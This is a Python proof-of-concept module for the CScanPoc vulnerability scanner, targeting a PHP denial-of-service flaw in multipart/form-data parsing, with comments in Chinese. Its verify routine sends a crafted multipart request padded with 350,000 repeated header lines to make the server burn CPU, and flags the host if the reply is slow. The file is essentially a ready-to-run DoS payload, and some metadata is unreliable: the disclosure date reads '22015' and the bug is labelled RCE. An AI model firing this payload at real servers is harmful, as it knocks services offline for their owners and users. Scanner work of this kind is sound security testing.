# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import datetime


class Vuln(ABVuln):
    vuln_id = 'PHP_0001'  # 平台漏洞编号，留空
    name = 'PHP 远程DOS漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '22015-05-17'  # 漏洞公布时间
    desc = '''
        PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。
        远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。
    '''  # 漏洞描述
    ref = 'https://blog.csdn.net/u010517901/article/details/46486365'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHP'  # 漏洞应用名称
    product_version = '所有版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6d479fbe-3bfb-472c-8e8a-1fdf6b5a56a3'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
                       'Accept-Encoding': 'gzip, deflate',
                       'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0'}
            body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=bb2.jpg"
            body = body + 'a\n' * 350000
            body = body + 'Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--'

            starttime = datetime.datetime.now()
            request = requests.post(self.target, body, headers=headers)
            endtime = datetime.datetime.now()
            usetime = (endtime - starttime).seconds
            if usetime > 6:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
